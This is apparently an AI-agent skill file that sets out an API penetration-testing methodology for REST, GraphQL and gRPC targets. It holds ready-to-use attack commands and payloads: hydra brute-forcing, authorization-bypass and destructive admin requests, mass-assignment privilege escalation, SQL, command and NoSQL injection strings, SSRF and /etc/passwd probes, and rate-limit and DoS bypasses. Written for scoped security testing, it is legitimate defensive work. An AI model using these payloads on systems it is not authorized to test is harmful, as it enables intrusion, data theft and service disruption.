---
name: api-mode
description: Activate on API testing for REST, GraphQL, or gRPC targets — use when the target exposes endpoints, OpenAPI/Swagger docs, or API keys; covers auth attacks, authorization bypass (BOLA/BFLA), mass assignment, fuzzing methodology, rate limiting bypass, versioning attacks, and GraphQL introspection. Say "Use when..." or "Activate on: API, API MODE, REST, GraphQL, gRPC, endpoint, mass assignment, authorization bypass."
---

# api-mode: API Security Testing (ORACLE)

> **VIABILITY GATE (HUNT_RULES.md §1 — mandatory before any deep-dive):** write the 4-line pre-flight — ATTACKER / REACH (+proving command) / IMPACT / DUPE-OOS. If REACH=dead or IMPACT=none → STOP, log one line to `./lessons.md`, move on. No deep-dive without a passing gate.

## 1. Mode identity

api-mode is the ORACLE persona for attacking web APIs across three wire protocols:

- **REST** (JSON/XML/form, HATEOAS, verb semantics, content-type negotiation).
- **GraphQL** (introspection, queries, mutations, aliases, batching).
- **gRPC** (HTTP/2 + Protocol Buffers, reflection, metadata).

Attack surface covered: authentication (JWT/OAuth/API keys), authorization bypass (BOLA/IDOR horizontal, BFLA vertical), mass assignment, versioning gaps, fuzzing methodology, rate-limiting bypass, and schema mining. The #1 API flaw is authorization — prioritize it over injection.

## 2. API discovery & documentation mining

1. **Swagger/OpenAPI:** probe `/swagger`, `/swagger.json`, `/swagger/index.html`, `/api-docs`, `/v2/api-docs`, `/v3/api-docs`, `/openapi.json`, `/docs`, `/redoc`.
2. **Wordlists:** scan for routes and hidden endpoints (see tools below). Follow `_links`/HATEOAS in responses — some link to admin endpoints.
3. **Mobile-app sourced endpoints:** extract endpoints from mobile binaries — Burp logging, apktool, or inspect JS bundles for fetch/XHR URLs; API keys frequently live in JS or mobile code.
4. **Inventory every endpoint** (Swagger + crawl + JS + mobile + kiterunner), then build the **auth matrix**: run each endpoint as unauthenticated, low-priv user, and admin; compare responses for gaps.

## 3. Attack blocks

### 3.1 Authentication attacks (JWT / OAuth / API keys)

Detection:
- Hit every endpoint without an auth header → note which return data (missing auth).
- Send expired / malformed / empty tokens → note 200s (broken validation).
- Try `Authorization: Bearer null`, `Authorization: Bearer undefined`, `Authorization: Bearer ` (empty), `Authorization: Basic YWRtaW46YWRtaW4=` (admin:admin).

Missing auth sweep:
```bash
for ep in $(cat api_endpoints.txt); do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "https://target$ep")
  [ "$code" != "401" ] && [ "$code" != "403" ] && echo "OPEN: $ep ($code)"
done
```

Token confusion:
```http
Authorization: Bearer eyJ...   → swap to another user's token
Authorization: Bearer           → empty
Authorization:                   → missing value
X-API-Key: test                 → default key
```

API key leakage: `/api/data?api_key=AKIA...` — keys in query strings leak via logs/referer; harvest from JS, mobile, wayback.

Basic auth brute:
```bash
hydra -L users.txt -P passwords.txt target https-post-form "/api/login:username=^USER^&password=^PASS^:invalid"
```

Bypasses:
- Missing auth on certain HTTP methods only (GET open, POST requires auth).
- Version downgrade: `/v2/users` requires auth; `/v1/users` doesn't.
- Internal header bypass: `X-Internal: true`, `X-Forwarded-For: 127.0.0.1`.

### 3.2 Authorization bypass (BOLA / BFLA)

Detection:
1. Identify every endpoint with an ID parameter.
2. Log in as User A, note their IDs. Replay requests with User B's IDs → 200 = BOLA (horizontal IDOR).
3. For BFLA: identify admin-only endpoints (via docs/JS/introspection). Call them as a regular user.

```http
# BOLA
GET /api/v1/orders/12345       # own order
GET /api/v1/orders/12346       # other user's order → if 200 = BOLA

# BFLA
GET /api/v1/admin/users        # admin-only
DELETE /api/v1/users/other_id  # destructive admin action
POST /api/v1/users/promote     # role escalation
PATCH /api/v1/settings/global  # tenant-wide config
```

UUID prediction & enumeration:
- UUIDv1 contains timestamp + MAC → predict adjacent UUIDs.
- UUIDv4 is random — but often leaked in other responses or error messages.

Parameter pollution for authz bypass:
```http
GET /api/orders?user_id=victim_id&user_id=attacker_id
```

Bypass techniques:
- Wrap ID in array: `{"id": ["victim_id"]}`.
- Nested object: `{"user": {"id": "victim_id"}}`.
- GraphQL alias batching to enumerate.
- JSON vs form body (different parsers → different authz).

Severity: BOLA 7.5–8.5, BFLA 9.0+.

### 3.3 Mass assignment

Detection:
- `GET /api/users/me` → note all fields in response.
- PATCH with each field → observe acceptance.
- Swagger/OpenAPI schema may list `readOnly` fields that can still be written.

```http
PATCH /api/users/me
{"role": "admin", "is_verified": true, "tenant_id": "other", "credits": 99999}

POST /api/register
{"email": "x@y", "password": "z", "is_admin": true}

PUT /api/orders/123
{"status": "refunded", "amount": 0}
```

GraphQL mutation mass assignment:
```graphql
mutation { updateProfile(input: { name: "x", role: "admin", balance: 99999 }) { id role } }
```

Severity: 8.5–9.5 if role/privilege modified.

### 3.4 Fuzzing methodology

Methodology:
1. **Inventory:** collect all endpoints (Swagger, crawl, JS, mobile, kiterunner).
2. **Auth matrix:** run every endpoint as unauthenticated, low-priv user, admin; compare.
3. **Parameter fuzz** — inject per param:
   - SQLi: `' OR 1=1-- -`, `" OR 1=1-- -`
   - XSS: `<svg/onload=alert(1)>`
   - SSRF: `http://169.254.169.254/`
   - SSTI: `{{7*7}}`
   - LFI: `../../../../etc/passwd`
   - Command injection: `; id`
   - NoSQL: `{"$ne":null}`
   - Type juggling: int→string, string→array, null, empty
4. **Content-Type fuzz:** same body as JSON, XML, form, multipart (different parsers → different auth/WAF behavior).
5. **Method fuzz:** GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD.
6. **Header fuzz:** inject auth-bypass headers per endpoint.
7. **Rate limit test:** 100 rapid-fire identical requests.

```bash
nuclei -l api_endpoints.txt -t http/cves/ -t http/exposures/ -t http/vulnerabilities/ -severity medium,high,critical
kr scan https://target -A=apiroutes-210126:20210126
ffuf -u 'https://target/api/search?FUZZ=test' -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc 200
arjun -u 'https://target/api/data' -m GET POST
```

REST-specific primitives:
- **Verb tampering:**
  ```bash
  for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do
    curl -sk -X $m -o /dev/null -w "$m %{http_code}\n" https://target/api/admin/users
  done
  ```
- **Content-Type juggling:**
  ```http
  Content-Type: application/json    → 403
  Content-Type: application/xml     → 200 (different parser, no auth check)
  Content-Type: text/plain           → 200 (WAF bypass)
  ```
- **Filter/Sort injection:**
  ```
  GET /api/users?sort=password      → leaks via sorted output
  GET /api/users?filter[password][$regex]=^a    → NoSQL operator injection
  GET /api/users?fields=id,email,password_hash   → field selection abuse
  ```
- **Pagination bypass:**
  ```
  GET /api/users?page=1&per_page=10000   → dump all
  GET /api/users?limit=-1                → some frameworks return all
  GET /api/users?offset=0&count=999999
  ```

### 3.5 Rate limiting bypass

- API key rate-limit per key → register multiple free keys.
- OAuth token rate-limit → rotate refresh tokens.
- GraphQL batching aliases → 100 queries in 1 HTTP request.
- JSON body array → `[{"action":"transfer"}, {"action":"transfer"}, ...]` bypasses per-request limit.
- HTTP/2 multiplexing → single-packet N requests arrive simultaneously before counter increments.
- API gateway route-based limit (`/api/v1/x` limited, `/api/v1/x/` not).

### 3.6 Versioning attacks

Old API versions often lack security fixes, rate limits, and auth enforcement applied to the latest version.

```bash
for v in v0 v1 v2 v3 v4 v5 beta internal legacy old dev staging test; do
  curl -sk -o /dev/null -w "$v: %{http_code}\n" "https://target/api/$v/users"
done
```

Also check `Accept: application/vnd.api.v1+json` header-based versioning.
- `/api/v1/users` returns all users (no pagination, no auth) while `/api/v3/users` has proper pagination + auth.
- `/api/v2/password/reset` has no rate limit.
- `/api/v1/upload` accepts any file type while v3 restricts.

### 3.7 GraphQL introspection, queries, mutations, aliases, batching

Introspection query (full):
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind name description
      fields(includeDeprecated: true) {
        name description
        args { name description type { ...TypeRef } defaultValue }
        type { ...TypeRef }
        isDeprecated deprecationReason
      }
      inputFields { name description type { ...TypeRef } defaultValue }
      interfaces { ...TypeRef }
      enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
      possibleTypes { ...TypeRef }
    }
    directives { name description locations args { name description type { ...TypeRef } defaultValue } }
  }
}
fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }
```

When introspection is disabled:
- **clairvoyance** — wordlist-based schema recovery via suggestion-based fuzzing.
- **graphql-path-enum** — build schema from error messages.
- Check GraphQL IDE endpoints: `/graphiql`, `/playground`, `/explorer`, `/altair`.

Post-introspection:
1. List all queries, mutations, subscriptions.
2. Identify sensitive fields (password, token, ssn, creditCard).
3. Test each with low-priv user for BOLA/BFLA.
4. Test mutations for mass assignment.
5. Use alias batching to enumerate BOLA IDs and to bypass per-request rate limits in a single HTTP request.

### 3.8 gRPC reflection

Detection: port-scan for HTTP/2 services (h2c or h2 with TLS); look for `.proto` files leaked in GitHub / mobile / JS.

Reflection-enabled server discovery:
```bash
grpcurl -plaintext target:50051 list
grpcurl -plaintext target:50051 describe mypackage.MyService
grpcurl -plaintext target:50051 mypackage.MyService/GetUser -d '{"id": "1"}'
```

Without reflection — use .proto from GitHub / mobile:
```bash
protoc --decode_raw < binary_response.bin
grpcurl -import-path ./protos -proto service.proto target:50051 mypackage.MyService/AdminAction
```

Auth bypass: gRPC metadata (like HTTP headers) — try without `authorization` metadata; test method-level auth (some methods require auth, others don't).

Input fuzzing:
```bash
grpcurl -plaintext -d '{"id": "1\' OR 1=1--"}' target:50051 mypackage.MyService/GetUser
```

DoS: large repeated field (10MB protobuf message); stream abuse (bidirectional streaming left open).

## 4. Key tools

- **Recon:** kiterunner, ffuf (param brute), Arjun, nuclei (API templates), clairvoyance, graphql-path-enum, graphql-voyager.
- **Burp:** Autorize (authz delta), AuthMatrix, Param Miner, inql (GraphQL), custom macros.
- **Auth:** hydra, nuclei auth templates, ffuf with auth headers.
- **Rate limit:** Turbo Intruder, fireprox.
- **gRPC:** grpcurl, grpcui, protobuf-inspector, BloomRPC.

## 5. Deep-dive files

- SKILL_FILES/VULNERABILITIES/API/rest_api_attacks.md
- SKILL_FILES/VULNERABILITIES/API/api_authentication_attacks.md
- SKILL_FILES/VULNERABILITIES/API/api_authorization_bypass.md
- SKILL_FILES/VULNERABILITIES/API/api_mass_assignment.md
- SKILL_FILES/VULNERABILITIES/API/api_fuzzing_methodology.md
- SKILL_FILES/VULNERABILITIES/API/api_rate_limiting_bypass.md
- SKILL_FILES/VULNERABILITIES/API/api_versioning_attacks.md
- SKILL_FILES/VULNERABILITIES/API/graphql_introspection_attacks.md
- SKILL_FILES/VULNERABILITIES/API/grpc_attacks.md